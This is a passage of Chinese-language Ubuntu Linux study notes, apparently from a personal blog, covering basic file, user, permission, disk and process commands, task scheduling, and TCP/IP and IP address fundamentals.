[目的地址]</p></li></ul></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">cp</span> a.cpp c.cpp //复制a.cpp到当前目录c.cpp中-v 查看复制过程-i 询问，是否覆盖原来已经存在的同名文件-r 递归处理，实现目录复制<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>mv 移动文件或目录，也可以进行重命名</strong></p><blockquote><ul><li><p style="color:blue;">mv [参数] [源地址] [目的地址]</p></li></ul></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">mv</span> dir1/a dir2/<span class="token function">mv</span> b bbb //b重命名为bbb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>rm 删除一个或多个文件，也可以递归删除目录</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">rm</span> dir1/bbb<span class="token function">rm</span> -ri dir1/ //递归处理来删除目录，并询问<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li><li><p>目录的基本操作</p><ul><li><p><strong>mkdir 创建一个目录</strong></p><blockquote><ul><li><p style="color:blue;">mkdir [参数] [目的地址]</p></li></ul></blockquote><pre class="line-numbers language-none"><code class="language-none">mkdir dir1 &#x2F;&#x2F;当前目录下创建一个目录mkdir -p dir2&#x2F;dir22&#x2F;dir222 &#x2F;&#x2F;-p实现多层目录的建立<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>rmdir 删除一个目录</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">rmdir</span> dir1<span class="token function">rmdir</span> -p dir2/dir22/dir22 //-p实现多层目录的全部删除<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li><li><p>查看文件内容</p><ul><li><p><strong>more 在终端屏幕按屏显示文本文件</strong></p><p>   在终端屏幕显示文本文件：Enter一行，空格一屏（如果-num有参数，显示num行），q退出</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">more</span> -8 /etc/passwd //每屏显示8行<span class="token function">ls</span> /etc/ <span class="token operator">|</span> <span class="token function">more</span> -10 //查看/etc目录的文件信息，每屏显示10行-p 实现清屏-d 显示友好信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>less 在终端屏幕按屏显示文本文件</strong></p><p>  在终端屏幕显示文本文件，不能Enter和Space翻阅，增加：鼠标滑动显示内容；底部提示符为“ : ”</p><pre class="line-numbers language-none"><code class="language-none">ls &#x2F;etc&#x2F; | less<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>head 显示前几行或几字节</strong></p>  <img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210001613397.png" alt="image-20230210001613397" style="zoom:67%;" /></li><li><p><strong>tail 显示前/最后几行或几字节</strong></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212191142439.png" alt="image-20230212191142439" style="zoom:67%;" /><p>（head和tail这两命令同理）</p></li><li><p>od 按照特殊格式查看文件内容</p><pre class="line-numbers language-none"><code class="language-none">字码基数 -d 十进制；-o 八进制(默认)；-x 十六进制 -t 设置输出格式<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li><p>文件类型</p><ul><li><p><strong>文件类型</strong></p><p><font color="red"><strong>- 普通文件</strong>，<strong>d 目录</strong>，c 字符设备（串口设备：调制解调器），b 块设备（接口设备：硬盘、光驱），l 符号链接文件（快捷方式），s 套接口文件（网络通信文件），p 管道文件（FIFO文件，进程间通信机制）</font></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210003215624.png" alt="image-20230210003215624" style="zoom:67%;" /></li><li><p><strong>file 辨识文件类型</strong></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210001908362.png" alt="image-20230210001908362" style="zoom:67%;" /></li></ul></li><li><p>查询文件</p><ol><li><p><strong>find 在目录结构中查找文件</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">find</span> /etc -name vim* //查找文件名中以vim开头的所有文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>locate 查找符合条件的文件</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">locate</span> cpuinfo //查找含有cpuinfo的文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>grep 查找包含指定关键字的文件</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">grep</span> -ir <span class="token string">"Ubuntu"</span> /user <span class="token operator">|</span> <span class="token function">less</span> //<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol></li><li><p>其他管理命令</p><ul><li><p><strong>ln 创建连接文件</strong></p><blockquote><ul><li><p style="color:blue;">ln [参数] [目的地址] [链接文件名]</p></li></ul></blockquote><p><font color="blue">两种链接：硬链接和软连接：</font></p><ul><li><strong>硬链接利用每个文件分配的物理编号inode建立的，因此不能跨越文件系统。修改硬链接的目标文件名，链接依然有效；</strong></li></ul></li></ul></li></ol><ul><li><strong>软连接利用文件路径名建立链接，通常为绝对路径，增加可移植性。修改软链接目标文件名，链接将断开</strong> <img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210002324999.png" alt="image-20230210002324999" style="zoom:67%;" /></li><li><strong>wc 统计文件的字数、字节数、行数等信息</strong></li></ul>  <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">   <span class="token function">wc</span> -c 字节<span class="token function">wc</span> -l 行数   <span class="token function">wc</span> -w 字数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre><code> &lt;img src=&quot;https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212191405117.png&quot; alt=&quot;image-20230212191405117&quot; style=&quot;zoom:67%;&quot; /&gt;</code></pre><ul><li><strong>comm 逐行比较两个<font color="blue">已排序</font>文件的差异，并显示</strong></li><li><strong>diff 逐行比较文本文件的异同处</strong>逐行比较文本文件的异同处。指定比较目录，会比较相同文件名的文件，不会比较子目录</li></ul><h4 id="P105-Ubuntu用户系统概述"><a href="#P105-Ubuntu用户系统概述" class="headerlink" title="P105: Ubuntu用户系统概述"></a>P105: Ubuntu用户系统概述</h4><p>Ubuntu Linux系统是一个<font color="red">多用户、多任务的分时</font>操作系统</p><p><font color=Brown>Ubuntu用户类型:  3个</font></p><ul><li><font color=Brown>初次创建的用户：完成比普通用户多的功能</font></li><li><font color=Brown>root用户 #：系统管理员，完成对系统的所有管理功能，拥有最高权限</font></li><li><font color=Brown>普通用户 ~：在安装完操作系统后，被创建的其他所有用户</font></li></ul><p>查看各个用户的相关信息：<strong>配置文件/etc/passwd</strong></p><p><strong>记录当前操作系统中所有用户的基本信息：用户名、用户UID、用户组ID(GID)、主目录路径、登录Shell等。</strong></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210004522336.png" alt="image-20230210004522336" style="zoom:67%;" /><h4 id="P113-用户管理命令"><a href="#P113-用户管理命令" class="headerlink" title="P113: 用户管理命令"></a>P113: 用户管理命令</h4><p>sudo和su的配置文件 /etc/sudoers</p><ol><li><p><font color=Brown><strong>添加用户 adduser</strong></font></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># adduser abc //添加一个名为abc的普通用户</span><span class="token comment"># adduser --system --home /home/xyz --shell /bin/bash xyz //添加一个名为xyx的系统用户，指定主目录为/home/xyz，默认shell为bash</span><span class="token punctuation">(</span>ls /home -<span class="token operator">></span> abc xyz<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><font color=Brown><strong>显示用户信息  finger</strong></font></p><p>finger命令用于查找用户，并显示对应用户的相关信息</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># sudo apt install finger</span>finger -l abc  //列出用户abc的详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>更改用户密码 passwd</p><p>passwd命令用于更改用户密码。如果当前用户为普通用户，只更改自己密码；当前用户为超级管理员，能更改所有用户密码</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">passwd</span> abc //更改用户abc的密码<span class="token function">passwd</span> -d abc //删除用户abc的密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><font color=Brown><strong>修改用户登录信息 usermode</strong></font></p><p>usermode命令用于修改已添加到系统中的某个用户的登录名、主目录、默认shell等与登录相关的信息</p><pre class="line-numbers language-none"><code class="language-none">usermode -l abcd abc &#x2F;&#x2F;将用户abc改名为abcdfinger abc &#x2F;&#x2F;查找登录名为abc的用户，不存在<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><font color=Brown><strong>显示用户ID id</strong></font></p><p>id命令用于显示系统中某个用户的UID、GID等识别号信号。</p><pre class="line-numbers language-none"><code class="language-none">id root &#x2F;&#x2F;显示用户root的所有IDid -u abc &#x2F;&#x2F;显示用户abc的UID-g 组ID  -G 所有组ID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>修改用户个人信息 chfn</p><p>chfn命令用于修改用户的基本个人信息，如真实姓名、电话号码等。</p><pre class="line-numbers language-none"><code class="language-none">chfn -f abcdefg abc &#x2F;&#x2F;将用户abc的真实姓名改为abcdefgchfn -h 1111111 abc &#x2F;&#x2F;设置用户abc的电话号码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><font color=Brown><strong>删除用户 deluser</strong></font></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">deluser --remove-all-files abc //删除用户abc以及一切相关文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="P117-组管理命令"><a href="#P117-组管理命令" class="headerlink" title="P117: 组管理命令"></a>P117: 组管理命令</h4><p>cat /etc/passwd 看用户信息；cat /etc/group 看组相关信息</p><ol><li><p><strong>添加用户组 addgroup</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">addgroup abc //添加一个普通用户组addgroup --system abc //添加一个系统用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>显示组内用户 groups</p><p>groups命令用于显示某个组里包含的用户</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">groups</span> root //显示用户组root内的用户<span class="token function">groups</span> abc //显示用户组abc内的用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>修改用户组信息 groupmod</strong></p><p>groupmod命令用于更改用户组的名称、ID等信息。</p><pre class="line-numbers language-none"><code class="language-none">groupmod -g 1002 abc &#x2F;&#x2F;更改用户组abc的GID为1002groupmod -n abcd abc &#x2F;&#x2F;更改用户组abc名称为abccat &#x2F;etc&#x2F;group | grep abc &#x2F;&#x2F;查看配置文件中abc信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>删除用户组 delgroup</strong></p><pre class="line-numbers language-none"><code class="language-none">delgroup abc &#x2F;&#x2F;删除用户组abc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="P118-权限管理"><a href="#P118-权限管理" class="headerlink" title="P118: 权限管理"></a>P118: 权限管理</h4><p>Ubuntu在管理自己的用户和文件时，都是依靠权限体系来提高安全性。</p><p>权限是指某一个用户或用户组能够使用系统资源的限制情况。root管理员拥有系统的最高权限；初次创建的用户拥有管理员的部分权限；其他普通用户的权限最低。</p><p><font color=Brown>对于文件，有读r、写w、修改x(可执行权限)三种权限。(二进制表示：100, 010, 001 ; <strong>八进制表示：4, 2, 1 -&gt; r+w+x=7，故7为最高权限</strong>)</font></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210225153846.png" alt="image-20230210225153846" style="zoom:50%;" /><ul><li>“drwxr-xr-x”表明了权限与用户组的关系，除第1位表示<strong>文件类型</strong>，剩余9位以3位为一组，分别表示<strong>文件归属用户的权限 u</strong>、归属用户组的权限 g、其他用户的权限 o。</li><li>“26”表示链接数</li><li>”bd bd”表示文件拥有者和该用户所归属的用户组</li></ul><pre class="line-numbers language-none"><code class="language-none">bd的3类用户和对应权限情况：它的拥有者是bd用户，对应权限是“rwx&quot;，对该文件具有读写修改的权限与bd用户同组的其他用户，对应权限是&quot;r-x&quot;，对该文件具有读和修改的权限其他用户，对应权限是&quot;r-x&quot;，对该文件具有读和修改的权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>权限字母表示法：</strong></p><table><thead><tr><th>字母</th><th>含义</th></tr></thead><tbody><tr><td>r, w, x 表示权限</td><td>可读，可写，可执行权限</td></tr><tr><td>a, u, g, o 表示文件归属关系</td><td>所有用户，归属用户，归属组，其他用户</td></tr><tr><td>=, +, - 表示权限变化</td><td>具备权限，添加某权限，去除某权限</td></tr></tbody></table><pre class="line-numbers language-none"><code class="language-none">例子：a+x：对所有用户添加可执行权限go-x：对归属组和其他用户去除原有可执行权限u&#x3D;rxw：对归属用户具备可读、可写、可执行权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong><font color=Brown>常用权限管理命令：</font></strong></p><p>利用shell命令，可以方便地查看文件和文件夹的权限，也可以方便地对权限作出修改，还可以对文件所属用户及群组进行修改</p><ul><li><p><strong>chmod 修改文件或文件夹的权限</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">字母表示法：<span class="token function">chmod</span> a+w a.cpp //对a.cpp文件的所有用户增加可写权限数字表示法：<span class="token function">chmod</span> <span class="token number">777</span> <span class="token builtin class-name">test</span> //修改目录test的权限为777，即所有用户都拥有可读、可写、可执行权限-R实现对目录下的文件权限的递归修改：<span class="token function">chmod</span> -cR <span class="token number">755</span> test/ //将test目录下所有文件权限改为755，包括目录本身，使用-c参数显示修改结果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>chown修改文件或目录的归属用户或归属组</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">chown</span> abc a.cpp //修改a.cpp文件的归属用户为abc<span class="token function">chown</span> -c abc.abc a.cpp //同时改变a.cpp文件的归属用户和用户组<span class="token function">chown</span> -v .abc a.cpp //改变a.cpp文件的归属用户组迭代：chown -cR abc <span class="token builtin class-name">test</span> //修改目录中所有文件的归属<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>chgrp专门修改文件或目录的归属组</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">chgrp</span> -c abc a.cpp //修改文件的归属组为abc<span class="token function">chgrp</span> -cR abc <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><h4 id="P127-磁盘概述"><a href="#P127-磁盘概述" class="headerlink" title="P127: 磁盘概述"></a>P127: 磁盘概述</h4><p>配置文件/etc/fstab 查看磁盘分区的情况及别名</p><p>没有实际的硬盘。<font color=Brown><strong>主分区/主挂载点的别名是/dev/sda1</strong>，即“/”挂载点</font>。/dev/sda5表示逻辑分区，虚拟设备：<font color=Brown><strong>/dev/scd0光驱</strong></font>，<font color=Brown><strong>/dev/fd0软驱</strong></font>。SWAP<font color=Brown><strong>交换分区被挂载至/root/swapfile</strong></font></p><p>/dev/后面部分表示一个具体的分区，hd表示IDE硬盘，sd表示SATA硬盘或其他外部设备，had中的第3位a表示这是该类型接口上的第1个设备。每一个IDE接口可以允许有两个设备，一个是主设备，另一个为从设备，可以分别用hda、hdb表示第1个IDE接口上的两个设备。</p><p><font color=Brown><strong>/dev/hda1~/dev/hda4都表示主分区</strong></font>，<font color=Brown><strong>/dev/hda5表示该硬盘上的第1个逻辑分区</strong></font>，分区的顺序是不能随意修改。</p><h4 id="P128-磁盘管理方法"><a href="#P128-磁盘管理方法" class="headerlink" title="P128: 磁盘管理方法"></a>P128: 磁盘管理方法</h4><ul><li><p><strong>fdisk 磁盘分区</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">fdisk</span> /dev/hda //对IDE硬盘进行分区<span class="token function">fdisk</span> -l //列出当前操作系统<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>mkfs</strong> 在分区上<strong>建立文件系统</strong>或格式化指定形式</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">mkfs</span> -v //显示命令使用方法<span class="token function">mkfs</span> -V //显示版本信息<span class="token function">mkfs</span> -t ext3 /dev/sda3 //将/dev/sda3的文件系统建立为ext3类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>mkswap 设置交换分区</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">mkswap</span> -c -vl /dev/sda5 <span class="token number">102400</span> //在/dev/sda5建立大小为100MB的交换分区，建立前先检查是否有损坏的区块<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>df 显示磁盘信息</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">df</span> -a //显示所有的磁盘信息-l 仅显示本地的文件系统信息 -i 显示索引节点信息<span class="token function">df</span> -t ext3 //显示系统中ext3类型的分区信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>du 显示目录的容量</strong></p><pre class="line-numbers language-none"><code class="language-none">du -a &#x2F;root &#x2F;&#x2F;显示&#x2F;root目录下每个文件的大小，以K为单位<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="P193-195-进程管理"><a href="#P193-195-进程管理" class="headerlink" title="P193-195: 进程管理"></a>P193-195: 进程管理</h4><p><font color=Brown><strong>什么是进程？什么是程序？进程有什么特点？父子进程的关系？</strong></font></p><p><strong><font color=Brown>进程的3种类型，基本信息(PID,PPID…)，3种基本状态(state,wait,running)</font></strong></p><p><strong>1.进程的概念：</strong></p><p>Ubuntu Linux 的所有任务都是在操作系统内核的调度下由CPU执行，很多时候，Linux是将任务和进程的慨念合在一起。<strong>进程的标准定义: 进程是可开发执行的程序在一个数据集合上的运行过程。</strong>进程是一个动态的使用系统资源，处于活动状态的应用程序。<strong>进程和程序有着显著的区别。</strong></p><ul><li>程序是静态概念，本身可以作为一种资源长期保存在磁盘上;进程是一个程序的执行过程,是动态概念,有一定的生命周期，如果进程一旦执行结束，就不再存在于操作系统中</li><li>进程是一个能独立运行的单位，能与其他进程并发执行，它是操作系统中资源申请调度的最小单位;而程序不能作为一个独立运行的单位，它也不占用CPU 资源</li><li>程序并不是和进程一一对应的 一个程序可以由多个进程共用,一个进程也可以在活动中有顺序地执行多个程序</li></ul><p>在Ubuntu Linux中，init进程是所有进程的发起者和控制者，每个进程都有一个编号<strong>PID</strong>，是进程在当前系统中运行的顺序。<strong>Init用于终结父进程</strong>，如果该进程出现了问题，操作系统会崩溃。</p><p>因为init进程在系统运行期间始终不会消亡或停止，所以系统总是可以确信它的存在，并在必要的时候以此为参照。因此，<strong>系统调用fork()函数来创建一个新进程</strong>，并且作为init的子进程，从而最终形成系统中运行的所有其他进程。</p><p>为了标识和管理进程，使用PCB进程控制块来进行此项重要工作。进程有以下几个主要参数：</p><ul><li><font color=Brown>PID</font>：进程号，唯一标识进程（父进程为1）        Process ID</li><li><font color=Brown>PPID</font>：父进程号，创建某个进程的上一个进程号      Parent PID</li><li>USER：启动某个进程的用户ID(UID)和该用户归属的组ID(GID)       </li><li>STAT：进程状态。一个进程可能处于多种状态，包括运行状态、等待状态（可被中断或不可被中断）、停止状态、睡眠状态和僵死状态等</li><li>PRIORITY：优先级</li><li>资源占用：占用系统资源</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">- <span class="token function">ps</span> aux  //查看当前所有运行着的进程信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong><font color=Brown>Ubuntu Linux进程的3种类型：</font></strong></p><ul><li>交互进程：由Shell启动的进程</li><li>批处理进程：与终端联系不大，在等待队列中按序执行</li><li>守护进程：后台运行的进程，一般总是活动状态</li></ul><p>2.<font color=Brown><strong>进程的运行状态</strong></font></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212115553914.png" alt="image-20230212115553914" style="zoom:67%;" /><ul><li>等待状态wait：该状态有两种模式，一种是可被中断的，另一种不可被中断。这种状态下的进程处于等待系统分配给它资源，如果一旦得到资源，将转入就绪状态。</li><li>就绪状态running：这种状态的进程当前没有运行,但所有申请的资源已经具备。只要内核对其进行调度，将立即拥有CPU的控制权，开始运行。</li><li>僵死状态zombie：也称僵尸状态或僵尸进程。这种状态下的进程已经运行完毕，执行了相应的任务，已经不再存在，但它的父进程留下了一个记录，包括一个退出码和一些时间信息等。</li><li>停止状态stop：正在运行的进程由于某些原因的影响而退出，将进入停止状态，例遇到更高优先级的进程占用了CPU资源。</li><li>中断状态interupt</li></ul><blockquote><p>进程状态60</p></blockquote><p>3.进程管理操作</p><ul><li><p><strong>ps 查看系统进程信息（静态信息）</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">-f:产生某个进程的一个完整信息清单。-a:显示所有用户的进程清单。-u:产生某个特定用户的进程清单。-x:显示后台运行进程。<span class="token function">ps</span> //显示与控制终端相关进程的基本信息<span class="token function">ps</span> -u abc -f //显示abc用户所有完整信息<span class="token function">ps</span> aux //显示系统中的所有进程信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>top 动态显示运行中的进程详细信息</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">top</span> -d <span class="token number">3</span> //每3秒动态更新进程信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>nice 设置进程运行优先级</strong></p><p>每个进程都有一个优先级参数，表示占有CPU资源的等级，优先级越高进程更容易获取CPU控制权。进程优先级一般为-20~19，-20为最高优先级。修改进程nice值，可以修改进程优先级。系统进程默认的优先级是0。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">nice</span> -5 process //优先级置为5。若没有指定默认置为10<span class="token function">nice</span> --12 process //优先级置为-12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong><font  color="blue">renice 修改进程的优先级</font></strong></p><p>可调范围-20~19</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">renice</span> <span class="token number">12</span> <span class="token number">7716</span> //修改PID7716的进程的优先级为12<span class="token function">sudo</span> <span class="token function">renice</span> <span class="token number">6</span> -u abc //修改abc用户所有进程优先级为6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>kill 终止进程命令</p><p>一般情况，可以通过停止一个进程的方法来正常结束该进程。但在某种情况下，进程没有响应，可使用kill命令停止某个活动。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">kill</span> -STOP <span class="token number">4385</span> //停止4385进程，但不退出<span class="token function">kill</span> -CONT <span class="token number">4385</span> //重新开始4385进程<span class="token function">kill</span> -9 <span class="token number">4385</span> //强制终止4385进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>killall 终止所有同名进程</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">killall</span> -9 process //终止系统中所有名为process的进程<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="P200-临时工作安排at"><a href="#P200-临时工作安排at" class="headerlink" title="P200: 临时工作安排at"></a>P200: 临时工作安排at</h4><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212141653461.png" alt="image-20230212141653461" style="zoom: 50%;" /><ol><li><p>服务启动</p><p>at命令用来安排完成临时性工作，即只需要执行一次的系统任务。使用该命令，需要提前启动一个进程，即启动一个服务。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> /etc/init.d/atd restart  //重新启动at服务<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用at命令</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> at <span class="token number">23</span>:50 <span class="token number">2009</span>-12-15 //在2009-12-15的23：50执行以下命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>维护当前系统中的at服务</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> atq //查询当前系统中的所有at进程<span class="token function">sudo</span> atrm <span class="token number">1</span> //删除1号工作任务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><p><strong>周期性工作安排cron</strong></p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps1.jpg" alt="img" style="zoom:67%;" /> </center>#### P211: TCP/IP基础<p>（尽可能写全面）</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221016160838763.png" alt="image-20221016160838763" style="zoom:80%;" /><ul><li><p><strong>网络接口层</strong>（Network Interface Physical)：模型的基层，负责数据帧的发送和接收（帧Frame是独立的网络信息传输单元)。网络接口层将帧格式的数据放到网络上，或从网上把帧取下来。</p></li><li><p><strong>互联层（Internet）</strong>：互联协议将数据包封装成Internet 数掂包（IP packet)，并运行必要的路由算法。这里有4种互联协议。</p><ul><li><strong>网际协议(IP)</strong>:负责在主机和网络之间路径寻址和路由数据包。</li><li><strong>地址解析协议（ARP)</strong>:获取同一物理网络中的硬件主机地址。</li><li><strong>因特网控制消息协议（(ICMP)</strong>:发送消息，并报告有关数据包的传送错误。</li><li><strong>互联组管理协议（IGMP)</strong>:实现本地多路广播路由器报告。</li></ul></li><li><p><strong>传输层</strong>:传输协议在主机之间提供通信会话。传输协议的选择根据数据传输方式而定。主要有以下两个传输协议。</p><ul><li>传输控制协议(<strong>TCP</strong>)：为应用程序提供<strong>可靠的</strong>通信连接。适合于一次传输<strong>大批数据</strong>的情况，并适用于要求得到响应的应用程序。</li><li>用户数据包协议（<strong>UDP</strong>）:提供了无连接通信，且不对传送包进行可靠性确认。适合于一次传输<strong>小量数据</strong>可靠性则由应用层确认。</li></ul></li><li><p><strong>应用层</strong>:应用程序通过这一层访问网络，主要包括常见的FTP、HTTP、DNS和 TELNET等协议。</p><ul><li><strong>Telnet</strong>:提供远程登录(终端仿真）服务。</li><li><strong>FTP</strong>:提供应用级的文件传送协议。,</li><li><strong>SMTP</strong>:简单邮件传送协议。</li><li><strong>SNMP</strong>:简单网络管理协议，使用传输层UDP 协议。</li><li><strong>DNS</strong>:域名解析服务，也就是将域名映像成IP地址的协议，使用传输层UDP协议。</li><li><strong>HTTP</strong>:超文本传输协议，访问Web所用的协议。</li></ul></li></ul><p>TCP/IP协议簇体系结构及各层协议结构如图。 在网络接口层，最重要的信息之一是主机的MAC地址，为48bit，在物理上唯一标识某台主机；IP层的IP地址在逻辑上唯一标识某台主机；在主机内部，传输层的端口对应唯一的应用服务。</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212134419401.png" alt="image-20230212134419401" style="zoom:67%;" /><h4 id="P212-IP地址表示形式及分类"><a href="#P212-IP地址表示形式及分类" class="headerlink" title="P212: IP地址表示形式及分类"></a>P212: IP地址表示形式及分类</h4><p>1.表示形式：</p><ul><li><p>二进制表示法</p></li><li><p>点分十进制表示法</p><p>IP地址由网络号和主机号组成，程度为4字节</p><ul><li>网络号：标识一个物理的网络，同一个网络上的所有主机使用同一个网络号，该号在互联网中是唯一的。</li><li>主机号：确定网络中的一个工作端、服务器、路由器或者其他TCP/IP 主机。对于同一个网络号来说，主机号是唯一的。每个TCP/IP主机由一个逻辑IP地址确定网络号和主机号。</li></ul></li></ul><p>2.IP地址分类</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212135517579.png" alt="image-20230212135517579" style="zoom:50%;" /><ul><li><strong>A类地址</strong>: 可以拥有最大数量的主机，最高位为0，紧跟的7位表示网络号，其余24位表示主机号，总共允许有 126个网络。</li><li><strong>B类地址</strong>: 被分配到中等规模和大规候的网络中，最高两位总被置为二进制的10，前16位为网络号，后16位 为主机号，允许有16384个网络。</li><li><strong>C类地址</strong>：高3为被置为二进制的110，前 24位为网络号，后8位为主机号，允许有大约200万个网络。</li><li>D类地址:被用于多路广播组用户，高4位总被置为1110,余下的位用于标明客户机所属的组。</li><li>E类地址是一种仅供试验的地址。</li></ul><p>几条准则：</p><ul><li>网络号不能为127。该标识号被保留作为回路及诊断功能。</li><li>不能将网络号和主机号的各位均置为1。如果每位都是1,该地址会被解释为网内广播而不是一个主机号</li><li>各位均不能置0，否则该地址被解释为“就是本网络”。</li><li>对于本网络来说，主机号应核唯一，否则会出现IP地址已分配或有冲突的错</li></ul><p><strong>网络划分标准</strong></p><h4 id="P217-TCP包头"><a href="#P217-TCP包头" class="headerlink" title="P217: TCP包头"></a>P217: TCP包头</h4><p>cat /usr/include/linux/tcp.h</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212221150069.png" alt="image-20230212221150069" style="zoom: 67%;" 